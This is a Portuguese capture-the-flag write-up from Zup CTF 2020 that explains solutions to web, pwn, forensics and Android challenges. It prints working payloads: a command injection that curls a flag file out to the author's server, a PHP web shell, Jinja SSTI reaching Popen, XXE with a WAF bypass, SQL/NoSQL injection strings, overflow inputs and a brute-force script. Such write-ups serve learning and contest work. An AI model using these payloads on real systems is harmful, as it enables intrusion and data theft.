# Write up - Gabriel Pinheiro
Segundo Lugar - Zup CTF 2020

## Desafios
 - Android
   - [Debug Me ✔️](#debug-me)
   - [File Access ✔️](#file-access)
   - [Resources ✔️](#resources)
   - [Strings ✔️](#strings)
   - [DB Leak ✔️](#db-leak)
   - [Decode ✔️](#decode)
   - [Export ✔️](#export)
   - [Shares and Prefs ✔️](#shares-and-prefs)
   - [Instrument ✔️](#instrument)
   - [Interception ✔️](#interception)
   - [Smali Injection ✔️](#smali-injection)
 - Crypto
   - Not Caesar
 - Forensics
   - A Friend
   - [lost flash drive ✔️](#lost-flash-drive)
   - [pdfcrypt ✔️](#pdfcrypt)
   - Ramp Cat
   - [unk ✔️](#unk)
 - Misc
   - [rotação ✔️](#rotação)
   - [AccessLog ✔️](#accesslog)
   - [Entre a flag escondida ✔️](#entre-a-flag-escondida)
 - pwn
   - [pwn1 ✔️](#pwn1)
   - [pwn4 ✔️](#pwn4)
   - [pwn2 ✔️](#pwn2)
   - pwn3
 - Web Application
   - [Easy 1 ✔️](#easy-1)
   - [Gato Misterioso ✔️](#gato-misterioso)
   - [Site nada legal ✔️](#site-nada-legal)
   - [Olhe bem perto ✔️](#olhe-bem-perto)
   - [Easy 2 ✔️](#easy-2)
   - [Server Status](#server-status)
   - [Bypass Login ✔️](#bypass-login)
   - [Ferramenta Hacker ✔️](#ferramenta-hacker)
   - [Eu odeio Injeção ✔️](#eu-odeio-injeção)
   - Perl
   - [Entidade Insegura ✔️](#entidade-insegura)
   - [LFI ? ✔️](#lfi-)
   - [Eu odeio Flask ✔️](#eu-odeio-flask)
 - Web Application
   - [Fucking ✔️](#fucking)
   - [Batata é bom ✔️](#batata-é-bom)

# Web Application
## Easy 1
**Falha**

Alguns sites têm seus servidores expondo informações de
infraestrutura ou até mesmo implementação nos headers.
Nesse caso a informação era a deliciosa flag haha

**Solução**

Bastou um curl por headers no endereço para expor os
headers:

```bash
> curl -I https://easyone.zup.com.br/
HTTP/1.1 200 OK
Server: nginx/1.19.0
Date: Sun, 11 Oct 2020 12:03:50 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/7.2.33
flag: ZUP-CTF{CU1D4D0_N40_4C3SS3_S3U_C4B3C4LH0}
```

**Flag**

ZUP-CTF{CU1D4D0_N40_4C3SS3_S3U_C4B3C4LH0}

## Gato Misterioso
**Falha**

Aplicações web podem instruir buscadores, crawlers e outros
robos sobre quais páginas eles devem ou não acessar ou
indexar por meio do arquivo `robots.txt`. Contudo, muitos
esquecem que usuários maliciosos podem acessar o
`robots.txt` exatamente para encontrar os arquivos que os
proprietários querem fora dos buscadores.

**Solução**

Acessando `http://54.94.193.248:12001/robots.txt`, foi
possível encontrar uma referência para `http://54.94.193.248:12001/secret/journal.md` onde estava a flag.

**Flag**

ZUP-CTF{N4D4_s3ns1v3l_no_robots.txt}

## Site nada legal
**Falha**

Muitos desenvolvedores iniciantes esquecem que o código do
cliente roda.. No cliente haha. As vezes acabam deixando
informações sensíveis lá onde usuários mal intencionados
poderiam ler.

**Solução**

Um simples curl revelou o código com a flag:
```bash
> curl https://mynicesite.zup.com.br
...
                <p>ZUP-CTF{J4v4_5cr1p7_e_p3r1g0s00}</p>
...
```

**Flag**

ZUP-CTF{J4v4_5cr1p7_e_p3r1g0s00}

## Olhe bem perto
**Falha**

Muitos desenvolvedores iniciantes esquecem que o código do
cliente roda.. No cliente haha. As vezes acabam deixando
informações sensíveis lá onde usuários mal intencionados
poderiam ler.

**Solução**

Um simples curl revelou o código com a flag:
```bash
> curl https://lookclosely.zup.com.br/
...
<p id="flag">ZUP-CTF{h1dden_EaSy}</p>
...
```

**Flag**

ZUP-CTF{h1dden_EaSy}


## Easy 2

**Falha**

Toda lógica de negócio deve ficar no servidor, o cliente
e sua comunicação com o server podem ser facilmente (as
vezes nem tão fácil haha) modificadas ou replicadas.

**Solução**

Identificando a requisição feita para o login, bastou
alterar o parâmetro `is_admin` de `0` para `1` e a flag
já veio na resposta. Adivinha? Um simples curl de novo =P

```bash
> curl 'https://easytwo.zup.com.br/index.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'username=admin&password=admin&is_admin=1'

ZUP-CTF{N4d4_p0d3_S3r_0CULT4DO_Fr0m_4_h4X0R}
...
```

**Flag**

ZUP-CTF{N4d4_p0d3_S3r_0CULT4DO_Fr0m_4_h4X0R}

## Server Status
**Falha**

Permitir que o usuário faça requisições através do servidor pode ser perigoso pois libera
acesso a redes locais, privadas ou requests com o IP do host.

**Solução**

Ao identificar pelos headers que era um server Apache, fiz um request para o endpoint
de status de uma extensão comum. Ela costuma permitir requests vindos somente de
127.0.0.1, portanto, não conseguiríamos acessar externamente.

Inserindo `http://localhost/server-status` a flag foi retornada.

**Flag**

ZUP-CTF{TH3_S_3r_v3r_is_UP}

## Bypass login

**Falha**

Serviços que têm OTPs/PINs ou outras "senhas" curtas devem
implementar alguma forma de rate-limit (quando
autenticados) ou anti-spam como CAPTCHAs, Hashcash, etc.
Caso contrário, usuários maliciosos conseguem, em poucas
horas, tentar todas combinações possíveis (com scripts ou
softwares desenhados para esse propósito) e acabar
encontrando a correta.

**Solução**

Fiz um script simples em JavaScript para tentar
combinações sequencialmente e rodei processos com 5
workers cada, em poucos minutos já tinha a chave. Para
identificar a correta, comparei o tamanho da resposta com
o tamanho da resposta de erro.

Após isso, bastou usar a chave para registrar e logar.
Após o login, lá estava a flag!

Script:
```JavaScript
const fetch = require("node-fetch");
const ERROR_LENGTH = 1207;

/**
 * Attempts to register using `code` and returns the response body length
 * @param {string} code Registration code
 */
function register(code) {
    return fetch("http://3.12.74.128:8008/register", {
    "headers": {
      "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
      "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
      "cache-control": "max-age=0",
      "content-type": "application/x-www-form-urlencoded",
      "upgrade-insecure-requests": "1",
      "cookie": "Attempts=2"
    },
    "referrer": "http://3.12.74.128:8008/register",
    "referrerPolicy": "strict-origin-when-cross-origin",
    "body": "email=test%40mail.me&password=password&code=" + code,
    "method": "POST",
    "mode": "cors"
  })
  .then(res => res.text())
  .then(t => t.length);
}

/**
 * Pads a number with zeroes to a fixed length: pad(42, 4) => 0042
 * @param {number} num Number to pad
 * @param {number} size Desired size
 */
function pad(num, size) {
  let text = num.toString();
  while(text.length < size) {
    text = "0" + text;
  }
  return text;
}

let attempts = 0;
async function bulk(from, to) {
  for(let i = from; i <= to; i++) {
    const code = pad(i, 6);
    const size = await register(code);
    attempts++;

    if(size != ERROR_LENGTH) {
      console.log("!!!!!!!!!!! BINGO! !!!!!!!!!!!");
      console.log(code, size);
      process.exit(0);
    }
  }
}

setInterval(() => {
  console.log(attempts/10, "req/s", new Date().toISOString());
  attempts = 0;
}, 10000);

(async () => {
  const tasks = [
    bulk(0, 1000),
    bulk(1001, 2000),
    bulk(2001, 3000),
    bulk(3001, 4000),
    bulk(4001, 5000),
  ];

  await Promise.all(tasks);
  console.log("Done!");
})();
```

**Flag**

Registration Code: 002864

Flag: ZUP-CTF{0_Br4b0_d0_bRU73_F0rc3}

## Ferramenta Hacker

Analizando as informações mandadas ao clicar em submit, fiz umas mudanças e percebi que
ao enviar `method`s não existentes, o erro era:

```undefined method `foo' for Tool:Class```

Portanto, a string era usada diretamente para buscar os métodos de um objeto. Analizando os headers, percebi que era um servidor em Ruby, portanto usei o curl:

```bash
> curl 'http://54.94.193.248:23200/' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'method=private_instance_methods'

...
  <textarea>[:timeout, :DelegateClass, :Digest, :humanize, :sprintf, :format, :Integer, :Float, :String, :Array, :Hash, :autoload, :warn, :local_variables, :autoload?, :require, :require_relative, :raise, :fail, :global_variables, :__method__, :__callee__, :__dir__, :eval, :iterator?, :block_given?, :catch, :throw, :loop, :binding, :URI, :gem_original_require, :trace_var, :untrace_var, :at_exit, :select, :Rational, :Complex, :`, :gem, :set_trace_func, :j, :JSON, :caller, :caller_locations, :test, :fork, :jj, :respond_to_missing?, :exit, :gets, :proc, :lambda, :sleep, :initialize_copy, :initialize_clone, :initialize_dup, :load, :syscall, :open, :printf, :print, :putc, :puts, :readline, :readlines, :p, :system, :exec, :exit!, :spawn, :abort, :rand, :srand, :trap, :method_missing, :singleton_method_added, :singleton_method_removed, :singleton_method_undefined, :initialize]</textarea>
...
```

Para listar os métodos privados do objeto e, após notar o método `system`, tentei
utilizá-lo para listar os arquivos, contudo, eu só recebia um `true` ou `false` ao invés
da saída do `ls`. Utilizei disso para descobrir que existia um arquivo flag.txt (afinal,
`cat arquivoquenexiste.txt` retornava `false` e `cat flag.txt` retornava `true`) e enviei
um curl que usaria o conteúdo do flag.txt como payload de um request para um servidor
meu, onde estaria rodando um processo logando o corpo para que eu pudesse ler o conteúdo:

```bash
> curl 'http://54.94.193.248:23200/' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'message=curl -XPOST --data @flag.txt https://<meu server aq>/cat&method=system'
```

E na hora foi logado no meu servidor a flag.

**Flag**

ZUP-CTF{Env1ar_e__muit00_dangerous_methodf}

## Eu odeio Injeção
**Falha**

Injeção NoSQL, nos permitiu alterar a condição de `equals` para `not equals`.

**Solução**

Identificando qual era a requisição sendo feita, bastou usar o amado curl para alterar
de `username=foo` para `username[$ne]=foo` (e o mesmo pra senha):
```bash
>curl 'https://vaccinated.zup.com.br/' \         
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'username[$ne]=foo&password[$ne]=bar'

ZUP-CTF{N_O5_qL__1nj3cT_1on}
```

**Flag**

ZUP-CTF{N_O5_qL__1nj3cT_1on}

## Entidade Insegura
**Falha**

Ao processar XMLs enviados pelo cliente é necessário tomar
bastante cuidado com falhas de XXE. No XML é possível
criar "variáveis" (entities) que referenciam seu conteúdo
de arquivos externos, locais (LFI) ou remotos (SSRF).
Assim, o usuário pode conseguir acesso a arquivos locais
ou escalar para um SSRF conseguindo fazer requisições para
a rede local, privada.

**Solução**

Se prepara que essa vai ser longa hahaha:

Ok... Olhando o site foi possível ver o upload de XMLs,
criei um XML referenciando o `/flag.txt` (que na página
`about` contava que a flag estaria lá):
```xml
<?xml version='1.0'?>
<!DOCTYPE foo [
    <!ENTITY foo SYSTEM "file:///flag.txt">
]>
<users>
    <user>
        <username>username</username>
        <password>password</password>
        <name>name</name>
        <email>&foo;</email>  
        <group>group</group>
    </user>
</users>
```

E... Não funcionou 🙃. Bom, na verdade não dava pra saber
se funcionou ou não, o sistema retornou um erro dizendo
que o arquivo foi bloqueado pelo WAF, removendo a entidade
remota o arquivo ia tranquilamente. Portanto, o WAF
provavelmente fazia alguma validação no texto do XML.

Agora entra a arte de WAF bypass, a técnica mais comum é
mudar o encoding do arquivo e, para minha sorte, a
especificação do XML suporta outras encodings além da
padrão: UTF-8. Tentei salvar o arquivo como UTF-16LE e...
BINGO! Arquivo aceito. MAS o conteúdo não estava lá :(

Aparentemente os campos tinham um limite de 20 caracteres
que cortava o conteúdo do arquivo, escondendo a flag.
Analizando melhor a estrutura dos usuários retornados
na listagem foi possível notar que existia mais um campo
`intro` que não estava no payload de modelo. Esse, por sua
vez não tinha limite de chars portanto consegui a flag!
```xml
<?xml version='1.0'?>
<!DOCTYPE foo [
    <!ENTITY foo SYSTEM "file:///flag.txt">
]>
<users>
    <user>
        <username>username</username>
        <password>password</password>
        <name>name</name>
        <email>&foo;</email>  
        <group>group</group>
        <intro>&foo;</intro>
    </user>
</users>
```

**Flag**

ZUP-CTF{_fl4g_XX3333_c0ngr4ts}

## LFI ?
**Falha**

Serviços que carregam dinamicamente arquivos em que o
usuário pode editar o que está sendo usado para gerar o
path são bem perigosos pois usuários maliciosos podem
brincar com suas entradas para acessar arquivos fora do
escopo da aplicação como arquivos de senhas (`/etc/passwd`)
ou até informações do processo como variáveis de ambiente
(`/proc/self/environ`) que podem conter senhas.

**Solução**

O desafio já entregava o endpoint vulnerável a LFI
(`file657354.php?abrir=`) no fonte da página principal,
após tentar acessar arquivos que poderiam conter
informações perigosas (como nossa mortal flag hehe) sem
sucesso, decidi dar uma olhada no fonte do próprio .php
(usando a LFI criada por ele mesmo) para procurar outras
vulnerabilidades.

E lá estava! Esse recurso, além de permitir abrir arquivos
arbitrários, também permitia criar mais arquivos. O
plano agora era claro, criar um .php que executasse
comandos no sistema para mim, escalando assim o LFI para
o bem mais perigoso RCE.

Mas não foi tão simples 🙃. A criação de arquivos bloqueava
as extensões `.php` e `.cgi`. Isso não era um problema pois
também existem outras extensões interpretadas como PHP tipo
a `.phtml`. Agora foi simples, criei um arquivo .phtml com
um scriptzinho php que executava meus comandos:
```php
<?php system($_GET['cmd']); ?>
```

Basta, agora, usar nosso amado curl como o terminal remoto haha:
```bash
> curl http://challenges.ctfd.io:30224/gabriel4.phtml\?cmd\=ls%20/var
003bataasadadafanavnvavavaa_flag.txt
...

> curl http://challenges.ctfd.io:30224/gabriel4.phtml\?cmd\=cat%20/var/003bataasadadafanavnvavavaa_flag.txt
ZUP-CTF{3sse_LFI_f01_d3_m4t4r_haha_}
```

**Flag**

ZUP-CTF{3sse_LFI_f01_d3_m4t4r_haha_}

# Web Application
## Fucking
**Falha**

Mais uma vez.. Lógica no cliente. Dessa vez o código foi,
pelo menos, ofuscado. Mas ainda tá no cliente então da pra
gente explorar haha :shrug:

**Solução**

JavaScript é uma linguagem linda, sério, sabia que é
possível escrever [qualquer código](https://www.youtube.com/watch?v=sRWE5tnaxlI) usando somente `()[]{}/>+!-=\`?
Quando que um Javão velho deixaria a gente fazer isso?!1!!1 Amo JS :)

E.. Foi assim que o autor do site decidiu ofuscar seu código. Existia uma função mais ou menos assim no fonte:
```JavaScript
function validate() {
  /* UM MONSTRO DE CARACTERES AQUI */();
}
```

Dava pra perceber que aquela monstruosidade toda gerava
uma função no final que era chamada ali mesmo dentro da
`validate`. Portanto, foi necessário só copiar todos os
caracteres exceto a invocação do final e colocar no
console javascript e lá estava o código da função em...
Letras dessa vez kkkk:

```JavaScript
if (document.forms[0].username.value == "corb3nik" && document.forms[0].password.value == "chickenachos") document.location = "4d4932602a75414640946d38ea6fefbf.php"
```

Bastou logar com essas credenciais que lá estava a flag.

**Flag**

ZUP-CTF{_y0ur_J4v4Scr1pt_Fuck}

## Batata é bom
**Falha**

Essa é a clássica injeção de SQL. Um usuário mal intencionado consegue manipular os
dados que, ao serem concatenados na query enviada ao banco, consegue alterá-la. Isso
pode fazer com que usuários tenham acesso a todo o banco dependendo do caso. Não
concatene dados de usuário na query, nunca, os bancos fornecem formas de você passar os
dados por fora da query como prepared statements. Se realmente for necessário
concatenar, deve-se escapar os dados do usuário para que ele não saia da query.

**Solução**

No campo de usuário, bastou colocar`' OR ''='` para fazer login, mais tarde, conhecendo
o schema do banco da pra imaginar que a query é algo como:

`SELECT 1 FROM username WHERE username = '**entrada do usuario**';`

Trocando a entrada do usuário por nossa string, a condição fica sempre verdadeira,
retornando linhas sempre:

`SELECT 1 FROM username WHERE username = '' OR ''='';`

E... Cadê a flag? É, não tava no site, ainda tive que dar uma brincada no banco para
achar. Havia um campo de pesquisa de batatas onde a resposta da query era enviada em uma
tabelinha pra gente. Perfeito para ler o banco inteirinho hahaha.

Ok, primeiro procurei por tabelas com nome contendo `flag`, na busca entrei com:

`ñ' UNION SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_name LIKE '%flag%'), 2 #`

O `ñ` foi só pra busca original não retornar nenhuma batata, o `2` é pra preencher a
segunda coluna e a UNION funcionar e o `#` comenta o restante da query original. Com
isso encontrei a tabela `flaggyflagflagnotgonnaspotthis`. Agora pra listar as colunas
entrei com a busca:

`ñ' UNION SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name ='flaggyflagflagnotgonnaspotthis'), 2 #`

Encontrei as colunas, a `flag` parece promissora então para um último select agora já
na tabela, fiz a busca:

`ñ' UNION SELECT (SELECT GROUP_CONCAT(flag) FROM flaggyflagflagnotgonnaspotthis), 2 #`

E *voilá*, uma das linhas continha a flag.

**Flag**

CTF{SQ1_Inj3ct10n_15_5uP3R_53cUR3}

## Eu odeio Flask
**Falha**

Em sistemas com que usam templating como Handlebars, DustJS ou Jinja deve-se tomar
cuidado para que o usuário não consiga injetar código que será interpretado pela engine
e possívelmente chamar helpers ou executar código maliciosos.

**Solução**

Sabendo que o desafio era um servidor de Flask, tentei encontrar formas de entrar com
informações que pudessem ser processadas como templates do Jinja, depois de muitas
tentativas sem sucesso, descobri que tinha um query parameter `name` que era mostrado
na página. Ao testar ele por SSTI, descobri que era vulnerável!

```bash
> curl http://iloveflask.zup.com.br/?name=\{\{3*3\}\}
...
9
...
```

Agora foi só listar as classes que estariam disponíveis para encontrar alguma que eu
pudesse utilizar para escalar o SSTI para RCE:
`http://iloveflask.zup.com.br/?name={{%27%27.__class__.__mro__[1].__subclasses__()}}`

Identificando que a classe `subprocess.Popen` estava no índice 222, a utilizei para
listar os arquivos da pasta: `http://iloveflask.zup.com.br/?name={{%27%27.__class__.__mro__[1].__subclasses__()[222](%27ls%27,%20shell=True,stdout=-1).communicate()}}`

Encontrei o arquivo flag.txt e li seu conteúdo da mesma forma:
`http://iloveflask.zup.com.br/?name={{%27%27.__class__.__mro__[1].__subclasses__()[222](%27cat%20flag.txt%27,%20shell=True,stdout=-1).communicate()}}`

# pwn
## pwn1
Abri o executável usando Hopper e identifiquei que as primeiras perguntas chamavam o `strcmp` com valores que estávam no próprio executável (que pude ler pelo Hopper também):
* Sir Lancelot of Camelot
* To seek the Holy Grail.

Contudo, a última pergunta comparava uma posição de memória com um número fixo. Bastou achar a quantidade certa de caracteres para sobrescrever o local de memória que era comparado e colocar o valor constante com qual ele era comparado:
```bash
echo -e "Sir Lancelot of Camelot\nTo seek the Holy Grail.\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc8\x10\xa1\xde" | nc 18.228.166.40 4321
```

## pwn2
Abri o executável usando Hopper e percebi que existiam funções `one`, `two` e `print_flag`. Tentei um overflow novamente e ao verificar os logs do `dmesg` o endereço do ponteiro de programa (endereço de onde as instruções eram executadas) era sobrescrito pelos caracteres que entrei. Portanto, bastou entrar com a quantidade certa de caracteres e o endereço da função `print_flag` e o programa saltou para sua execução.
```bash
python2 -c "print('A'*30 + '\xd8\x06\x00\x00')" | nc 18.228.166.40 4322
```

## pwn4
**Falha**

Uma simples injeção bash, é executado um comando `ls` com parâmetros do usuário,
contudo, foi possível encadear outro comando para ser executado usando `;`.

**Solução**

Ao verificar que existe um arquivo flag.txt enviado o argumento `.`, bastou listar
novamente e encadear um cat: `.; cat flag.txt`.

**Flag**

ZUP-CTF{Syst3m_0v3rfl0w}

# Misc
## rotação
Cifra de cesar, cada caracter é rotacionado por X vezes, nesse caso, 5+8.

**Flag**

ZUP-CTF{C3S3aR_CiPH3rs_AR3_NoT_CRYPToGR4pH1CaLLY_SoUND}

## AccessLog
A dica estava na própria URL: String.fromCharCode

Fiz um scriptzinho em JS para resolver:
```JavaScript
"108%2C+97%2C+103%2C+32%2C+105%2C+115%2C+32%2C+83%2C+81%2C+76%2C+95%2C+73%2C+110%2C+106%2C+101%2C+99%2C+116%2C+105%2C+111%2C+110"
    .split("%2C+")
    .map(Number)
    .map(n => String.fromCharCode(n))
    .join("")
```

**Flag**

CTF-ZUP{SQL_Injection}

## Entre a flag escondida
Verificando o fonte, notei um link para `flag.html`, uma página com duas imagens, usflag.png e NKflag.jpg.

Ao passar a NKflag.jpg pelo steghide, notei um arquivo escondido, `steganopayload22698.txt`:
```bash
> steghide info NKflag.jpg    
"NKflag.jpg":
  format: jpeg
  capacity: 9,3 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "steganopayload22698.txt":
    size: 30,0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes

> steghide extract -sf NKflag.jpg
Enter passphrase: 
wrote extracted data to "steganopayload22698.txt".

> cat steganopayload22698.txt 
ZUP-CTF{Y0u_H4V3_N0_P4t13NcE}
```

**Flag**

ZUP-CTF{Y0u_H4V3_N0_P4t13NcE}

## lost flash drive
Dentro do .zip havia uma imagem de disco, bastou montá-la em uma pasta do meu PC.
Utilizei o parted para descobrir o início da partição:
```bash
> parted -s lost_flash_drive print
Model:  (file)
Disk /home/gabrielzup/Desktop/lost_flash_drive: 4010MB
Sector size (logical/physical): 512B/512B
Partition Table: msdos
Disk Flags:

Number  Start  End     Size    Type     File system  Flags
 1      1024B  4010MB  4010MB  primary
```

E usando ele como offset, montei em uma pasta no meu pc:
```bash
> mkdir /mnt/tmp1
> sudo mount -o loop,offset=1024 lost_flash_drive /mnt/tmp1
```

Na estrutura de arquivos, existia um zip com senhas que chamou atenção, lá realmente
estava a flag:
```
> cd /mnt/tmp1
> tree
.
├── Documents
│   ├── fw9.pdf
│   └── passwords.txt.zip
├── Pictures
│   ├── cook-food-kitchen-eat-54455.jpg
│   ├── food-dinner-lemon-rice.jpg
│   ├── food-dinner-pasta-spaghetti-8500.jpg
│   ├── food-salad-restaurant-person.jpg
│   ├── pexels-photo-139259.jpg
│   ├── pexels-photo-247685.png
│   ├── pexels-photo-262918.jpg
│   ├── pexels-photo-326278.jpg
│   ├── pexels-photo-372882.jpg
│   ├── pexels-photo-376464.jpg
│   ├── pexels-photo-70497.jpg
│   ├── potatoes-french-mourning-funny-162971.jpg
│   └── salmon-dish-food-meal-46239.jpg
└── Videos
    ├── forest_sky_stuff.mp4
    └── girls_riding_rollercoaster.mp4

3 directories, 17 files

> cd Documents
> unzip passwords.txt.zip
Archive:  passwords.txt.zip
  inflating: passwords.txt           
   creating: __MACOSX/
  inflating: __MACOSX/._passwords.txt
> cat passwords.txt
lumpy:LumpySpacePrincessIsTheBest
lsp_98:spaceprincesslumps
space-princess:lumpyspacekingdom
LumpySpacePrincess:flag{its_adventure_time_yee_boi!!!}
```

**Flag**

flag{its_adventure_time_yee_boi!!!}

## pdfcrypt
Para quebrar a senha do .pdf, utilizei o `pdfcrack` junto da wordlist `rockyou.txt`:

```bash
pdfcrack encrypted.pdf -w rockyou.txt     

PDF version 1.5
Security Handler: Standard
V: 2
R: 3
P: -4
Length: 128
Encrypted Metadata: True
FileID: 1db41bb48e9dd31ec67a3a29a274480e
U: 5bbb29f8836700ad2d4ad9329e76622b00000000000000000000000000000000
O: 8911d092254cfa6e8805d444732c3ebcbee4aaf98042d588eeac0e633f7c9ac1
found user-password: 'hacked'
```

A senha foi encontrada em segundos: hacked

Bastou abrir o pdf para encontrar a flag.

**Flag**

flag{kramer_the_best_hacker_ever}

## unk
Dezipando o arquivo, foi criada uma estrutura de docx, contudo, nem precisei recriar o documento, abrindo a thumbnail já foi possível ler a flag:

```bash
> unzip unk
Archive:  unk
file #1:  bad zipfile offset (local header sig):  0
  inflating: _rels/.rels             
  inflating: word/_rels/document.xml.rels  
  inflating: word/document.xml       
  inflating: word/theme/theme1.xml   
 extracting: docProps/thumbnail.jpeg  
  inflating: word/settings.xml       
  inflating: word/fontTable.xml      
  inflating: word/webSettings.xml    
  inflating: docProps/core.xml       
  inflating: word/styles.xml         
  inflating: docProps/app.xml

> xdg-open docProps/thumbnail.jpeg
```

**Flag**

flag{old_macdonald_or_mcdonalds_supplier?}

# Android
## Debug Me
**Falha**

Aplicações não devem logar informações importantes, usuários maliciosos podem facilmente
capturá-las.

**Solução**

Bastou rodar o app no Android Studio® e clicar no "LOG THE KEY" que ela foi logada no
console.

**Flag**

ZUP-{p4r4n01d 4ndr01d}

## File Access
**Falha**

Arquivos com credenciais ou outras informações privadas não devem ficar no .apk por
serem facilmente acessíveis.

**Solução**

Bastou extrair o .apk em uma pasta e em `assets/secrets` estava a flag.

**Flag**

ZUP-{k4rm4 p0l1c3}

## Resources

Bastou extrair o .apk e em `res/raw/link.txt` estava a flag.

**Flag**

ZUP-{41rb46}

## Strings
Extraindo o .apk com o suporte da ferramenta `apktools.jar` foi possível encontrar
o arquivo de strings e a flag estava lá dentro: `res/values/strings.xml`

**Flag**

ZUP-{1d1073qu3}

## DB Leak
Rodei a aplicação no Android Studio e acessei, usando o Device File Explorer, o arquivo
do db em `/data/data/com.revo.evabs/databases/MAINFRAME_ACCESS` e encontrei a flag com
Ctrl+F

**Flag**

ZUP-{f4k3 pl4571c 7r335}

## Decode
Extraindo o .apk com a ferramenta `apktools.jar`, passando o .dex pela ferramenta
`dex2jar 2.0` e abrindo o .jar com a ferramenta `jd-gui` (chega de ferramentas haha)
foi possível encontrar esse trecho de código na classe Decode.class:
```Java
StringBuilder stringBuilder = new StringBuilder();
stringBuilder.append("WlVQLXto");
stringBuilder.append("MHU1MyAwZiBj");
stringBuilder.append("NHJkNX0=");
stringBuilder.toString();
```
Juntando os fragmentos e decodando o base64, encontrei a flag!

**Flag**

ZUP-{h0u53 0f c4rd5}


## Export
Analizando as activities com exported true no AndroidManifest.xml, encontrei a
ExportedActivity. Bastou iniciar a aplicação com `adb shell am start -n 'com.revo.evabs/com.revo.evabs.ExportedActivity'` e ela já abriu a activity com a flag na tela.

**Flag**

ZUP-{3x17 mu51c}

## Shares and Prefs
Rodei a aplicação no Android Studio e acessei, usando o Device File Explorer, o arquivo
em `/data/data/com.revo.evabs/shared_prefs/DETAILS.xml` e encontrei a flag.

**Flag**

ZUP-{r3ck0n3r}

## Interception

Usando Charles Proxy foi possível perceber que ao clicar em Receive, o app enviava um
GET para `https://pastebin.com/raw/90YqHMgT` e recebia a flag na resposta.

**Flag**

ZUP-{7h3r3 7h3r3}

## Instrument

Extraindo o .apk com a ferramenta `apktools.jar`, passando o .dex pela ferramenta
`dex2jar 2.0` e abrindo o .jar com a ferramenta `jd-gui` foi possível encontrar o trecho
de código:
```java
if (this.x > i + 150) {
  textView1.setText("VIBRAN IS RESDY TO FLY! YOU ARE GOING HOME!");
  Log.d("CONGRATZ!", stringFromJNI());
  return;
} 
textView1.setText("Co-ordinates Not Found!");
```

Se e somente se o if for verdadeiro, a flag é logada no console. Portanto, bastava negar
a condição no Smali e recompilar para que obtenhamos nossa flag. Analizando o Frida1.smali encontrei o trecho correspondente:

```smali
.line 50
iget v6, p0, Lcom/revo/evabs/Frida1;->x:I

# Esse é o if
if-le v6, v5, :cond_0

.line 51
const-string v6, "VIBRAN IS RESDY TO FLY! YOU ARE GOING HOME!"

invoke-virtual {v0, v6}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

.line 52
invoke-virtual {p0}, Lcom/revo/evabs/Frida1;->stringFromJNI()Ljava/lang/String;

move-result-object v6

.line 53
.local v6, "x":Ljava/lang/String;
const-string v7, "CONGRATZ!"
```

E bastou trocar o if-le (less or equal) por if-gt (greater than), remontar usando o
`apktools.jar` e assinar o pacote usando o `sign.jar`. Rodando a aplicação novamente,
bastava clicar no botão e a flag era logada no console.

**Flag**

ZUP-{w31rd f15h35}

## Smali Injection

Extraindo o .apk com a ferramenta `apktools.jar`, passando o .dex pela ferramenta
`dex2jar 2.0` e abrindo o .jar com a ferramenta `jd-gui` foi possível encontrar o trecho
de código:
```java
String SIGNAL = "LAB_OFF";
...
if (SmaliInject.this.SIGNAL.equals("LAB_ON")) {
  tvlaboff.setText("SYS_CTRL_CODE: LAB_ON");
  labstat.setText("SYS_CTRL: ACCESS_GRANTED. LAB UNLOCKED");
  TextView textView = tvflag;
  StringBuilder stringBuilder = new StringBuilder();
  stringBuilder.append("ZUP-{");
  stringBuilder.append(str);
  stringBuilder.append("}");
  textView.setText(stringBuilder.toString());
  return;
} 
tvlaboff.setText("SYS_CTRL_CODE: LAB_OFF");
labstat.setText("SYS_CTRL: ACCESS_DENIED");
...
```

Ou seja, caso a constante SIGNAL da classe valesse LAB_ON, a flag era logada. Assim
sendo, bastou encontrar o Smali correspondente. No SmaliInject.smali:
```smali
.method public constructor <init>()V
    .locals 1

    .line 11
    invoke-direct {p0}, Landroid/support/v7/app/AppCompatActivity;-><init>()V

    .line 13
    # A constante a ser alterada
    const-string v0, "LAB_OFF"

    iput-object v0, p0, Lcom/revo/evabs/SmaliInject;->SIGNAL:Ljava/lang/String;

    return-void
.end method
```

Troquei o `LAB_OFF` por `LAB_ON`, remontei usando o `apktools.jar` e assinar o pacote
usando o `sign.jar`. Ao rodar a aplicação e clicar no botão, a flag era jogada na tela.

**Flag**

ZUP-{n0 5urpr1535}
